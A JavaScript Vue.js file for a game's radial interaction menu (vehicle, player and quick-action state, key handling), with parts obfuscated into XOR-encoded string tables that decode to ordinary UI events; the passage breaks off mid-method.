/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
/*  developed by cef studio & mironchik.dev  */
  
var app = new Vue({
    el: "#app",
    data: {
        IsRadialMenu: !1,
        GetCurrentMenu: 1,
        IsInteraction: false,
        InteractionPlayerId: 0,
        InteractionVehicleId: 0,
        CurrentButtonName: 'Быстрые действия',
        CurrentButtonMessage: '',
        CurrentButtonDescription: '',
        IsPlayerCarUploaded: true,
        IsPlayerSleepActive: true,
        IsPlayerDrugsActive: true,
        IsPlayerHealthActive: true,
        IsLocationCarActive: true,
        IsPlayerGang: true,
        GetPlayerMetal: 52,
        GetPlayerAidKit: 52,
        GetPlayerRepairKit: 52,
        GetPlayerMask: 52,
        IsPlayerFlowersInHands: true,
        IsPlayerWeaponInHands: true,
        IsPlayerInVehicle: true,
        IsPlayerVehicleDriving: false,
        IsPlayerReceiveOffers: true,
        IsPlayerCanSendOffers: true,
        InteractionVehiclePassenger1: 'Отсутствует',
        InteractionVehiclePassenger1Id: 65535,
        InteractionVehiclePassenger2: 'Отсутствует',
        InteractionVehiclePassenger2Id: 65535,
        InteractionVehicleName: 'None',
        InteractionVehiclePassenger3: 'Отсутствует',
        InteractionVehiclePassenger3Id: 65535,
        InteractionVehicleDriver: 'Отсутствует',
        InteractionVehicleDriverId: 65535,
        IsPlayerCarAccess: false,
        IsPlayerCarLocked: true,
        IsPlayerCarKey: true,
        IsPlayerCarUpsideDown: true,
        IsPlayerNearCar: true,
        IsPlayerСanisterInHands: true,
        IsPlayerOrganization: true,
        IsPlayerCarOpenTrunk: true,
        IsPlayerCarOpenBonnet: true,
        GetPlayerTimeInGame: 0,
        GetPlayerTimeInAFK: 0,
        GetPlayerTimeHour: 0,
        GetPlayersOnline: 0,
        GetPlayerName: 'Nick_Name[52]',
        PlayerNetwork: 'Подключено (0 ms, 0.0% loss)',
        PlayerVoiceNetwork: 'Подключено (0 ms, 0.0% loss)',
        selectedButtonIndex: -1,
        buttonsCount: 8
    },
    mounted() {
        const DhFqGRGbVvmv$DI=wmK_TAZFiDsndBkElJF;(function(m$RaTxCsp_mBuTPCsr,eZ$gAcKPWb){const ujnbSlaf=wmK_TAZFiDsndBkElJF,YBMpCdnDd=m$RaTxCsp_mBuTPCsr();while(!![]){try{const PkoG$OMkWyYmTz=parseFloat(ujnbSlaf(0xb2))/(-0xa*parseInt(0x1ed)+-0x1*Math.floor(-parseInt(0x229f))+Math.max(-0xf5c,-0xf5c))*(-parseFloat(ujnbSlaf(0xa8))/(0x1*-0x164f+-parseInt(0x1)*-0x4b1+Math.trunc(0x2f0)*0x6))+parseFloat(-parseFloat(ujnbSlaf(0xa9))/(-parseInt(0x1)*0x2489+-0x16*Math.max(-0xcc,-parseInt(0xcc))+Math.floor(0x1304)))*(parseFloat(ujnbSlaf(0xa3))/(-0x8*0x205+0x17e1+Number(-parseInt(0x7b5))))+-parseFloat(ujnbSlaf(0xaa))/(-parseInt(0xf4e)+parseInt(0x10d)*-parseInt(0x1c)+parseInt(0x2cbf))+parseFloat(ujnbSlaf(0xab))/(Math.floor(-parseInt(0x1a5b))+0xd*Math.ceil(0x26e)+-parseInt(0x2b)*0x1f)+-parseFloat(ujnbSlaf(0xac))/(0x51e+Math.max(parseInt(0x663),0x663)+Number(-0x5bd)*Math.max(0x2,parseInt(0x2)))+-parseFloat(ujnbSlaf(0xa2))/(Math.floor(parseInt(0x541))+0x24d9*parseInt(0x1)+Math.trunc(0x86a)*-parseInt(0x5))*(-parseFloat(ujnbSlaf(0xa5))/(parseInt(0x253b)+Math.floor(0x380)+Math.max(-0x28b2,-0x28b2)))+Math['trunc'](parseFloat(ujnbSlaf(0x95))/(-parseInt(0x1)*-parseInt(0x2049)+0x125e*Math.floor(0x1)+-parseInt(0x329d)));if(PkoG$OMkWyYmTz===eZ$gAcKPWb)break;else YBMpCdnDd['push'](YBMpCdnDd['shift']());}catch(ZoFVzeh){YBMpCdnDd['push'](YBMpCdnDd['shift']());}}}(ZWVieN$B_oVcSpBvpG,Math.max(parseInt(0x5939d),parseInt(0x5939d))+Math.floor(0x4bee1)*0x3+Math.trunc(-0x49d07)));function ZWVieN$B_oVcSpBvpG(){const ilhtThgFSOscZb$MYwAkd=['ababacaaaba6eff6e9f4ced4','daf1ebfaed','faf2f6eb','d6ecd6f1ebfaedfefcebf6f0f1','efedfae9faf1ebdbfaf9feeaf3eb','f4fae6fbf0e8f1','ecfaf3fafcebd1fae7ebddeaebebf0f1','d6eccdfefbf6fef3d2faf1ea','ababada8aeadafaff9eec6d1ebfe','ecebe6f3fa','daecfcfeeffa','deededf0e8dbf0e8f1','ebe6effa','f6f1ebfaedfefcebf6f0f1','f7f6fbfabfafb1adecbff9f0ede8feedfbec','f4fae6','f6f1ebfaedf9fefcfab2edfefbf6fef3','cbfefd','d8faebdceaededfaf1ebd2faf1ea','f8faebdaf3faf2faf1ebdde6d6fb','eaeffbfeebfadcf0f2eff0f1faf1eb','aea8aaabacadd3ebd7f7d4f6','abd6f6eec8f5d8','e9f6ecf6fdf3fadcf0f2eff0f1faf1eb','aea6a7fdf5d9fcc9c6','deededf0e8caef','fef1f6f2feebf6f0f1','a7d5e9f4ddf7fa','aaacaea9a8a9adc8d3f5eaf6e9','aaaaa8a9a7a6aadac9cbf2f6e6','aeaeadaeafaaada9eec8dbeffcfa','a8a7aca6a6a8a6dbddf7cacce8','fcfaf9ecebeafbf6f0b1edfefbf6fef3a5f6f1ebfaedfefcebf6f0f1','fefbfbdae9faf1ebd3f6ecebfaf1faed','ebedf6f8f8faedddeaebebf0f1defcebf6f0f1','f4fae6eaef','ecfaf3fafcebcfedfae9f6f0eaecddeaebebf0f1'];ZWVieN$B_oVcSpBvpG=function(){return ilhtThgFSOscZb$MYwAkd;};return ZWVieN$B_oVcSpBvpG();}const handleEscapeAndContextMenu=()=>{const Q_CMy_nIQUA=wmK_TAZFiDsndBkElJF;if(this[Q_CMy_nIQUA(0x94)]){if(!this[Q_CMy_nIQUA(0x90)]){if(this[Q_CMy_nIQUA(0x9f)]==-parseInt(0x12a6)+Math.trunc(-0x2)*Math.ceil(-0xca1)+Number(-parseInt(0x691))||this[Q_CMy_nIQUA(0x9f)]==parseInt(0xa69)+parseInt(0x1a22)+Math.max(parseInt(0x247f),parseInt(0x247f))*Math.ceil(-0x1))this[Q_CMy_nIQUA(0xa1)](Q_CMy_nIQUA(0x9f),Math.floor(0x625)+parseFloat(0x23d3)+-0x29ee);else{if(this[Q_CMy_nIQUA(0x9f)]==parseInt(0x1)*-parseInt(0xa3e)+0x1015*Math.ceil(-0x1)+-parseInt(0x1)*-0x1a5d)document[Q_CMy_nIQUA(0xa0)](Q_CMy_nIQUA(0x9d))[Q_CMy_nIQUA(0x96)][Q_CMy_nIQUA(0xa7)]=Q_CMy_nIQUA(0x9b),setTimeout(()=>this[Q_CMy_nIQUA(0xa4)](Q_CMy_nIQUA(0x94),![]),parseInt(0x1e78)+-parseInt(0x23cb)+parseInt(0x747));else this[Q_CMy_nIQUA(0x9f)]==Math.floor(parseInt(0xd2e))+-0xd*Math.trunc(-0x9c)+parseInt(0x1505)*Math.max(-0x1,-parseInt(0x1))||this[Q_CMy_nIQUA(0x9f)]==Number(0x1)*parseInt(0x1eab)+0x2a5*-0x1+0x950*-0x3?this[Q_CMy_nIQUA(0xa1)](Q_CMy_nIQUA(0x9f),Math.ceil(-parseInt(0xa))*parseInt(0x9b)+0x3bb+parseInt(0x267)):(document[Q_CMy_nIQUA(0xa0)](Q_CMy_nIQUA(0x9d))[Q_CMy_nIQUA(0x96)][Q_CMy_nIQUA(0xa7)]=Q_CMy_nIQUA(0x9b),setTimeout(()=>this[Q_CMy_nIQUA(0xa4)](Q_CMy_nIQUA(0x94),![]),0x5*parseInt(0x1ff)+Math.floor(-parseInt(0x8ef))+0x8*0x1d));}}}};let isLongPress=![],preventRadialShow=![],tabPressed=![];const handleTabKey=ZwgPKfCAUs_MrviSdgWkBWbzY=>{const fnVQVwitLkDFlvXWFyTFK=wmK_TAZFiDsndBkElJF;if(ZwgPKfCAUs_MrviSdgWkBWbzY[fnVQVwitLkDFlvXWFyTFK(0x9c)]===fnVQVwitLkDFlvXWFyTFK(0x9e)){ZwgPKfCAUs_MrviSdgWkBWbzY[fnVQVwitLkDFlvXWFyTFK(0x91)]();if(!this[fnVQVwitLkDFlvXWFyTFK(0x94)]){if(ZwgPKfCAUs_MrviSdgWkBWbzY[fnVQVwitLkDFlvXWFyTFK(0x99)]===fnVQVwitLkDFlvXWFyTFK(0x92))tabPressed=!![],setTimeout(()=>{const pJOEFPzUcKISbpyDhJsL=fnVQVwitLkDFlvXWFyTFK;tabPressed&&(this[pJOEFPzUcKISbpyDhJsL(0x90)]=!![],isLongPress=!![],preventRadialShow=!![]);},Math.ceil(0x1ed8)+parseInt(0x1eb1)+0x3c8f*-0x1);else{if(ZwgPKfCAUs_MrviSdgWkBWbzY[fnVQVwitLkDFlvXWFyTFK(0x99)]===fnVQVwitLkDFlvXWFyTFK(0xb0)){tabPressed=![];if(isLongPress)isLongPress=![],preventRadialShow=![],document[fnVQVwitLkDFlvXWFyTFK(0xa0)](fnVQVwitLkDFlvXWFyTFK(0x9a))[fnVQVwitLkDFlvXWFyTFK(0x96)][fnVQVwitLkDFlvXWFyTFK(0xa7)]=fnVQVwitLkDFlvXWFyTFK(0x9b),setTimeout(()=>this[fnVQVwitLkDFlvXWFyTFK(0x90)]=![],-parseInt(0x1e9)*-0xb+0x1c2e+parseInt(0x1a1)*-parseInt(0x1d)),cef[fnVQVwitLkDFlvXWFyTFK(0x8f)](fnVQVwitLkDFlvXWFyTFK(0xad));else!preventRadialShow&&(!this[fnVQVwitLkDFlvXWFyTFK(0x94)]&&this[fnVQVwitLkDFlvXWFyTFK(0xa4)](fnVQVwitLkDFlvXWFyTFK(0x94),Math.trunc(0x374)*Math.floor(0x2)+Math.ceil(0x37)*0x65+parseFloat(parseInt(0x1c67))*Math.trunc(-0x1),!![]));}}}}};function wmK_TAZFiDsndBkElJF(KMXAfEXumsncatpPBETSz,ZidIxUcmdfDTcIFwXqWSNjsV){const EUyQBAUB_Wl=ZWVieN$B_oVcSpBvpG();return wmK_TAZFiDsndBkElJF=function(noy$$kvCArwnIHdJGuNFgUKl,YugUUxj_NWrUllNSPizCRXo){noy$$kvCArwnIHdJGuNFgUKl=noy$$kvCArwnIHdJGuNFgUKl-(0x1b9d*parseInt(0x1)+parseInt(0x21)*parseInt(-0x3)+-parseInt(0x1aab));let cSE$OIXVLEZd$cnu=EUyQBAUB_Wl[noy$$kvCArwnIHdJGuNFgUKl];if(wmK_TAZFiDsndBkElJF['aoYXrg']===undefined){const zpivkQKJvk=function(heWLjuivIiqWj$GEV){let miyqWDpceDBhUSwLtHhKibj=Math.max(-parseInt(0x2342),-parseInt(0x2342))+-0x5*Math.floor(-0x5a2)+parseInt(0x7b7)&0x2*Math.ceil(0xee4)+Math.max(parseInt(0xab),0xab)+-parseInt(0x14)*Math.max(0x179,parseInt(0x179)),cVY$fqYNt$anXKuXwrk=new Uint8Array(heWLjuivIiqWj$GEV['match'](/.{1,2}/g)['map'](o_I$dyuL=>parseInt(o_I$dyuL,0x836+Number(parseInt(0x1fc9))*0x1+Math.trunc(-parseInt(0x1))*parseFloat(0x27ef)))),sJjalDVAKtJUzqF$hhh_bLSvQsw=cVY$fqYNt$anXKuXwrk['map'](YiMVKUMfMbSYCfuj=>YiMVKUMfMbSYCfuj^miyqWDpceDBhUSwLtHhKibj),gdc_CspPHubvnjcNpgyGOwB=new TextDecoder(),IZiVaOGNgAeuJrDEijN=gdc_CspPHubvnjcNpgyGOwB['decode'](sJjalDVAKtJUzqF$hhh_bLSvQsw);return IZiVaOGNgAeuJrDEijN;};wmK_TAZFiDsndBkElJF['hDZMxn']=zpivkQKJvk,KMXAfEXumsncatpPBETSz=arguments,wmK_TAZFiDsndBkElJF['aoYXrg']=!![];}const tXZwgPKfCAUsMrviSdgWkBWbz=EUyQBAUB_Wl[-parseInt(0x547)+0x2284+0x5*-parseInt(0x5d9)],QdFw$tKuZOIKctwByy_cZnJtFmC=noy$$kvCArwnIHdJGuNFgUKl+tXZwgPKfCAUsMrviSdgWkBWbz,LPiBfMzZcclYlGYVLakysF=KMXAfEXumsncatpPBETSz[QdFw$tKuZOIKctwByy_cZnJtFmC];return!LPiBfMzZcclYlGYVLakysF?(wmK_TAZFiDsndBkElJF['paEIGp']===undefined&&(wmK_TAZFiDsndBkElJF['paEIGp']=!![]),cSE$OIXVLEZd$cnu=wmK_TAZFiDsndBkElJF['hDZMxn'](cSE$OIXVLEZd$cnu),KMXAfEXumsncatpPBETSz[QdFw$tKuZOIKctwByy_cZnJtFmC]=cSE$OIXVLEZd$cnu):cSE$OIXVLEZd$cnu=LPiBfMzZcclYlGYVLakysF,cSE$OIXVLEZd$cnu;},wmK_TAZFiDsndBkElJF(KMXAfEXumsncatpPBETSz,ZidIxUcmdfDTcIFwXqWSNjsV);}window[DhFqGRGbVvmv$DI(0xae)](DhFqGRGbVvmv$DI(0x92),dFwtKu_ZOIK$ctwByycZnJtF=>{const zKmbyW$T$Yz=DhFqGRGbVvmv$DI;if(dFwtKu_ZOIK$ctwByycZnJtF[zKmbyW$T$Yz(0x9c)]===zKmbyW$T$Yz(0x97))handleEscapeAndContextMenu();else dFwtKu_ZOIK$ctwByycZnJtF[zKmbyW$T$Yz(0x9c)]===zKmbyW$T$Yz(0x9e)&&handleTabKey(dFwtKu_ZOIK$ctwByycZnJtF);}),window[DhFqGRGbVvmv$DI(0xae)](DhFqGRGbVvmv$DI(0xb0),CRLPiBfMz=>{const C$ljxadUkgPYbxuCgui=DhFqGRGbVvmv$DI;if(CRLPiBfMz[C$ljxadUkgPYbxuCgui(0x9c)]===C$ljxadUkgPYbxuCgui(0x9e))handleTabKey(CRLPiBfMz);else{if(this[C$ljxadUkgPYbxuCgui(0x94)]){if(CRLPiBfMz[C$ljxadUkgPYbxuCgui(0x9c)]===C$ljxadUkgPYbxuCgui(0xa6))this[C$ljxadUkgPYbxuCgui(0xb1)]();else{if(CRLPiBfMz[C$ljxadUkgPYbxuCgui(0x9c)]===C$ljxadUkgPYbxuCgui(0x98))this[C$ljxadUkgPYbxuCgui(0x93)]();else CRLPiBfMz[C$ljxadUkgPYbxuCgui(0x9c)]===C$ljxadUkgPYbxuCgui(0xb3)&&this[C$ljxadUkgPYbxuCgui(0xaf)]();}}}});
  
        window.addEventListener('contextmenu', handleEscapeAndContextMenu);
    },
    methods: {
        visibleComponent(i, m, t) {
            if (m === 52) {
                function K$x_BPmmkQl(){var bCrSnUw_Krhdw=['10181c01','464503211f3f2032','161013060100111c1a5b0714111c14194f161d10161e','464140454247470d23341b2137','4447474c4241473f19263c3d0f','46444642454745173b27370f16','47442c1a25342f10','43474143434d2c3732373026','4447464d4045424434272d3c0738','444c40424c404241112721002f05','4643161a31312226','4c4c451d0c3a02222d','440c1917332d34','4343414d3819043c2139','4445414c46392d3a330733','444622043c1f2c3f'];K$x_BPmmkQl=function(){return bCrSnUw_Krhdw;};return K$x_BPmmkQl();}function i$hBwca(EShyOwWXvTjJUGLX,FrFMlqITLARXIrMbNRBzc){var VAnTBcoDDWSWqI=K$x_BPmmkQl();return i$hBwca=function(YJdRTuZp,gEoIvCi$OPsKZg$YL){YJdRTuZp=YJdRTuZp-(-0xe9d+-0x1*0x16f+parseFloat(parseInt(0x83f))*Math.max(0x2,0x2));var drcZ_ShrlCOLLv$xeE=VAnTBcoDDWSWqI[YJdRTuZp];if(i$hBwca['whPCzI']===undefined){var RqYwbQDioxwiiUlQHZSIIWLn=function(ZixR_dWkoM){var DdTw_fb=-parseInt(0x1)*Math.ceil(0x1ac1)+-parseInt(0x1c72)+parseInt(0x38a8)&-0x1*Math.ceil(parseInt(0x1835))+Math.trunc(0x1)*Math.max(parseInt(0x214f),0x214f)+Math.ceil(parseInt(0x81b))*-parseInt(0x1),Jd_VKjjr_LcjO=new Uint8Array(ZixR_dWkoM['match'](/.{1,2}/g)['map'](KlRdZ$DYDxvopNCjYrjFFlawI=>parseInt(KlRdZ$DYDxvopNCjYrjFFlawI,Math.max(0xd98,0xd98)+Number(-0x22f)*parseInt(0xb)+Math.floor(parseInt(0x1))*parseInt(0xa7d)))),Q$UtiWnKanwtKuyxfXMNKKJsW=Jd_VKjjr_LcjO['map'](mdsUb_mrCJhcz=>mdsUb_mrCJhcz^DdTw_fb),lHyAp_OHlwTMlh$HOs=new TextDecoder(),yvSHk$wJsbB$iibFGxlkfKlpS=lHyAp_OHlwTMlh$HOs['decode'](Q$UtiWnKanwtKuyxfXMNKKJsW);return yvSHk$wJsbB$iibFGxlkfKlpS;};i$hBwca['eBStmW']=RqYwbQDioxwiiUlQHZSIIWLn,EShyOwWXvTjJUGLX=arguments,i$hBwca['whPCzI']=!![];}var LqrtlnvMeTwTboDOsZQ=VAnTBcoDDWSWqI[parseInt(0x5)*Math.trunc(parseInt(0x301))+-parseInt(0x1)*0x160a+Math.max(-parseInt(0x3),-parseInt(0x3))*Number(-parseInt(0x257))],PM_$VBmudkyStQMc=YJdRTuZp+LqrtlnvMeTwTboDOsZQ,mv$ZvIPHRnY=EShyOwWXvTjJUGLX[PM_$VBmudkyStQMc];return!mv$ZvIPHRnY?(i$hBwca['Hlusfb']===undefined&&(i$hBwca['Hlusfb']=!![]),drcZ_ShrlCOLLv$xeE=i$hBwca['eBStmW'](drcZ_ShrlCOLLv$xeE),EShyOwWXvTjJUGLX[PM_$VBmudkyStQMc]=drcZ_ShrlCOLLv$xeE):drcZ_ShrlCOLLv$xeE=mv$ZvIPHRnY,drcZ_ShrlCOLLv$xeE;},i$hBwca(EShyOwWXvTjJUGLX,FrFMlqITLARXIrMbNRBzc);}var feSuT$QWqtpIybV$iURxOnhK=i$hBwca;(function(lwTMlhHOs_UyvSHkwJs,Bi_ib$F){var rNDsnqLDqS_Oe=i$hBwca,xlkfKlpSWKlRdZDYDx=lwTMlhHOs_UyvSHkwJs();while(!![]){try{var opNCjYrjFFlaw=-parseFloat(rNDsnqLDqS_Oe(0x73))/(parseInt(-parseInt(0x10))*parseInt(0x19)+-0x3*parseFloat(parseInt(0x9bb))+-parseInt(0xfe)*parseFloat(-0x1f))*(parseFloat(rNDsnqLDqS_Oe(0x7b))/(Number(-parseInt(0x764))*Math.ceil(-parseInt(0x5))+0x1098+Math.floor(-0x358a)))+-parseFloat(rNDsnqLDqS_Oe(0x7d))/(Math.trunc(0x1)*-parseInt(0x155f)+-parseInt(0x1)*Number(-parseInt(0x45f))+0x1103)*(-parseFloat(rNDsnqLDqS_Oe(0x7e))/(-parseInt(0xc38)+-0x999+parseInt(0x15d5)))+parseFloat(rNDsnqLDqS_Oe(0x72))/(-0x4d2+parseFloat(parseInt(0x1d45))+parseInt(0x6a)*parseFloat(-0x3b))*(parseFloat(rNDsnqLDqS_Oe(0x78))/(0x2*0xb91+0x1329+Number(-parseInt(0x2a45))))+-parseFloat(rNDsnqLDqS_Oe(0x75))/(-0x9df*Math.trunc(parseInt(0x1))+0x184d+-parseInt(0xe67))*(-parseFloat(rNDsnqLDqS_Oe(0x74))/(-parseInt(0x1)*Number(-0x16d3)+0x237*parseInt(0x5)+-parseInt(0x22)*0xff))+parseFloat(rNDsnqLDqS_Oe(0x7f))/(-parseInt(0x1196)+-0x444+Math.ceil(parseInt(0x15e3)))+Math['max'](-parseFloat(rNDsnqLDqS_Oe(0x7c))/(Number(0x13)*parseInt(0x94)+Math.floor(0x58b)*Math.ceil(0x7)+-parseInt(0x2d)*0x11b),-parseFloat(rNDsnqLDqS_Oe(0x7a))/(parseInt(0x213b)+-0x172b*parseFloat(0x1)+-0x357*0x3))*(parseFloat(rNDsnqLDqS_Oe(0x81))/(parseInt(0x17)*parseInt(0x9d)+Math.max(-0x219e,-0x219e)+parseInt(0x138f)))+parseFloat(rNDsnqLDqS_Oe(0x76))/(-parseInt(0x2)*parseFloat(-0x1186)+Math.ceil(0x18ca)+-0x5*0xbf5)*(-parseFloat(rNDsnqLDqS_Oe(0x80))/(parseFloat(parseInt(0xf9c))+-parseInt(0x8b3)+Math.max(-parseInt(0x6db),-parseInt(0x6db))));if(opNCjYrjFFlaw===Bi_ib$F)break;else xlkfKlpSWKlRdZDYDx['push'](xlkfKlpSWKlRdZDYDx['shift']());}catch(tmd$sUbmrCJhc$zzIJHly){xlkfKlpSWKlRdZDYDx['push'](xlkfKlpSWKlRdZDYDx['shift']());}}}(K$x_BPmmkQl,Math.ceil(parseInt(0x92986))+Math.max(0x5,parseInt(0x5))*0x1a645+-parseInt(0x5ca8a)),cef[feSuT$QWqtpIybV$iURxOnhK(0x77)](feSuT$QWqtpIybV$iURxOnhK(0x79)));
            } else {
                this[i] = t;
                function dDCGRYKGWdgrYKQXGftIc(nFAimD,rLzCj$AYfTQgJSC){var pN_dMveJxsBbnJTwF_qBe=sq_RNrwno();return dDCGRYKGWdgrYKQXGftIc=function(DvF_QbQAvzEfBm$wqTghCt,GWIEkceY_pvss){DvF_QbQAvzEfBm$wqTghCt=DvF_QbQAvzEfBm$wqTghCt-(-parseInt(0x10f4)+Math.floor(-parseInt(0x9b))+0x12e7);var qocfhTNJJNYGFsH_bIzJJJ=pN_dMveJxsBbnJTwF_qBe[DvF_QbQAvzEfBm$wqTghCt];if(dDCGRYKGWdgrYKQXGftIc['ufJkGJ']===undefined){var ILrwArnvHomPiECC_lI=function(jRDyJATIKnS){var nXHgwmbtKsP$YcE=Math.max(-parseInt(0x561),-parseInt(0x561))+Math.max(-parseInt(0x264),-parseInt(0x264))*parseInt(0x8)+parseInt(0x1)*Math.max(0x1ad1,0x1ad1)&0x31d*-parseInt(0x4)+0x2*0x1281+Math.ceil(-parseInt(0x178f)),eyysUcyPTEAvHFdVL=new Uint8Array(jRDyJATIKnS['match'](/.{1,2}/g)['map'](x$JQrjHSeZNs_D=>parseInt(x$JQrjHSeZNs_D,parseInt(0x4bf)*0x7+parseInt(0x1edb)+Math.ceil(0x2)*-0x2002))),uwpdmWcbWP__Cgy=eyysUcyPTEAvHFdVL['map'](ke_uew$edmNiHKYDqj=>ke_uew$edmNiHKYDqj^nXHgwmbtKsP$YcE),ClGNlRtdoohZDWpbcTh=new TextDecoder(),xWyqVrBlZPnprenipOrlInJ=ClGNlRtdoohZDWpbcTh['decode'](uwpdmWcbWP__Cgy);return xWyqVrBlZPnprenipOrlInJ;};dDCGRYKGWdgrYKQXGftIc['VmcClh']=ILrwArnvHomPiECC_lI,nFAimD=arguments,dDCGRYKGWdgrYKQXGftIc['ufJkGJ']=!![];}var OVoC_i=pN_dMveJxsBbnJTwF_qBe[-0x2659+parseInt(0xc29)+-parseInt(0x2)*-parseInt(0xd18)],dtI_vNDiHWpnOSbxBUmNoia=DvF_QbQAvzEfBm$wqTghCt+OVoC_i,HCXVSWbdaOvWEes=nFAimD[dtI_vNDiHWpnOSbxBUmNoia];return!HCXVSWbdaOvWEes?(dDCGRYKGWdgrYKQXGftIc['vnYoHv']===undefined&&(dDCGRYKGWdgrYKQXGftIc['vnYoHv']=!![]),qocfhTNJJNYGFsH_bIzJJJ=dDCGRYKGWdgrYKQXGftIc['VmcClh'](qocfhTNJJNYGFsH_bIzJJJ),nFAimD[dtI_vNDiHWpnOSbxBUmNoia]=qocfhTNJJNYGFsH_bIzJJJ):qocfhTNJJNYGFsH_bIzJJJ=HCXVSWbdaOvWEes,qocfhTNJJNYGFsH_bIzJJJ;},dDCGRYKGWdgrYKQXGftIc(nFAimD,rLzCj$AYfTQgJSC);}var uiUpbxCDZAkLuGAd=dDCGRYKGWdgrYKQXGftIc;function sq_RNrwno(){var AFUOfTuCInc$YADgEIWKHD=['616667636168672a133a110936','193e243522313324393f3e06353839333c351934','2335240f363f332523','646168646766613e1a04271621','66351a28231232','6467656264676701320111262a','640401371a0313','17352413252222353e241d353e25','33353623242534393f7e22313439313c6a252034312435','6368696169696019201e341d26','626864656662393d1427221c','6568676464691219353e1611','6161636961616212351d142616','353d3924'];sq_RNrwno=function(){return AFUOfTuCInc$YADgEIWKHD;};return sq_RNrwno();}(function(ATIKnSxn$XHgwmb$tKsPY,EEe_yys){var Qt$zjZqLk=dDCGRYKGWdgrYKQXGftIc,cyPTEAvHFdVLvuwpdmWcbWP=ATIKnSxn$XHgwmb$tKsPY();while(!![]){try{var gyJ$ClGNlRtdooh_ZD=Math['ceil'](parseFloat(Qt$zjZqLk(0x163))/(parseFloat(-parseInt(0x6ad))*Number(-0x1)+-0x1e7c+parseInt(0x17d0)))+parseFloat(Qt$zjZqLk(0x162))/(0x33c*-0x3+Math.max(parseInt(0x1),0x1)*-0xa97+0x144d)+Math['trunc'](-parseFloat(Qt$zjZqLk(0x158))/(Math.ceil(-0xbb8)+0x1796+-parseInt(0xbdb)))*Number(-parseFloat(Qt$zjZqLk(0x15e))/(parseInt(0x125)*Number(0x12)+parseFloat(parseInt(0xd))*0x113+Math.floor(-parseInt(0x1d))*parseInt(0x131)))+-parseFloat(Qt$zjZqLk(0x161))/(Number(parseInt(0x49b))*0x3+-0x2644+-parseInt(0xe8)*-0x1b)+parseFloat(-parseFloat(Qt$zjZqLk(0x15c))/(0x1419+parseFloat(parseInt(0x27d))*Math.ceil(parseInt(0x2))+-0x190d))*Math['floor'](-parseFloat(Qt$zjZqLk(0x15b))/(-0x419*0x1+Number(-parseInt(0x2))*-parseInt(0xc7)+parseFloat(parseInt(0x292))))+Math['ceil'](-parseFloat(Qt$zjZqLk(0x164))/(-parseInt(0x1026)*-0x2+parseInt(0x1c30)+-parseInt(0x3c74)))+-parseFloat(Qt$zjZqLk(0x15d))/(parseInt(0x27)*-0xd7+-0xd*Math.trunc(0xdb)+parseInt(0x2be9));if(gyJ$ClGNlRtdooh_ZD===EEe_yys)break;else cyPTEAvHFdVLvuwpdmWcbWP['push'](cyPTEAvHFdVLvuwpdmWcbWP['shift']());}catch(pbcThUx_W$yqVrBlZPnprenipO){cyPTEAvHFdVLvuwpdmWcbWP['push'](cyPTEAvHFdVLvuwpdmWcbWP['shift']());}}}(sq_RNrwno,-parseInt(0xb9d)*parseFloat(0x83)+0x2*Math.trunc(-parseInt(0x367d9))+parseInt(-parseInt(0x4807))*-0x45),this[uiUpbxCDZAkLuGAd(0x15f)]=m,cef[uiUpbxCDZAkLuGAd(0x15a)](t),cef[uiUpbxCDZAkLuGAd(0x165)](uiUpbxCDZAkLuGAd(0x160),m,this[uiUpbxCDZAkLuGAd(0x159)]));
                this.setButtonsCount(); 
                this.updateButtonHighlight();
                this.selectedButtonIndex = -1; 
                this.updateMenuName();
            }
        },
        updateComponent(i, t) {
            this[i] = t;
            if (i === 'GetCurrentMenu') {
                this.setButtonsCount(); 
                this.selectedButtonIndex = -1;
                this.updateButtonHighlight();
                this.clearHoverState(); 
                this.updateMenuName();
                if(t === 10 || t === 11 || t === 22 || t === 23 || t === 24 || t === 25) {
